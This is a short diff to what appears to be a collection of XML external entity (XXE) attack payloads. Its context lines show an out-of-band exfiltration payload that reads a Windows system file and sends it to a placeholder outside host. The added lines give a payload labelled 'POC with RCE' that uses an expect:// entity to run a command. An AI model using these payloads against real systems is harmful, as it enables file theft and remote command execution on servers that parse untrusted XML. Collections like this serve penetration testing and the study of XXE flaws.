@@ -47,4 +47,16 @@
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
 
+---------------------------------------------------------------------------------------
+
+
+## POC with RCE ## 
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
 
